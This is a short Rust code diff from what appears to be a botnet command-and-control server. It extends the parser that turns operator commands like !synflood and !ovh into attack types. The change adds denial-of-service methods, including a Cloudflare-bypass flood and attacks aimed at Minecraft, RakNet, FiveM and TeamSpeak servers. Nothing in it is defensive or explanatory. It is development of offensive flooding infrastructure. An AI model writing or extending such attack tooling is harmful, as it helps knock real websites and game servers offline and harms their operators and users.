@@ -102,11 +102,17 @@ pub fn validate_attack_method(method: &str) -> Result<String> {
         "!http" => "HTTP",
         "!synflood" => "SYN",
         "!ackflood" => "ACK",
-        "!slowloris" => "HTTP", // Map to HTTP or specific if available
+        "!slowloris" => "SLOWLORIS",
         "!sslflood" | "!tls" => "TLS",
         "!vse" => "VSE",
         "!ovh" => "OVH",
         "!std" => "STD",
+        "!cfbypass" => "CFBYPASS",
+        "!stress" => "STRESS",
+        "!minecraft" => "MINECRAFT",
+        "!raknet" => "RAKNET",
+        "!fivem" => "FIVEM",
+        "!ts3" | "!teamspeak" => "TS3",
         _ => {
             return Err(CncError::InvalidCommand(
                 format!("Unknown attack method: {}. Type 'methods' to see available methods", method)
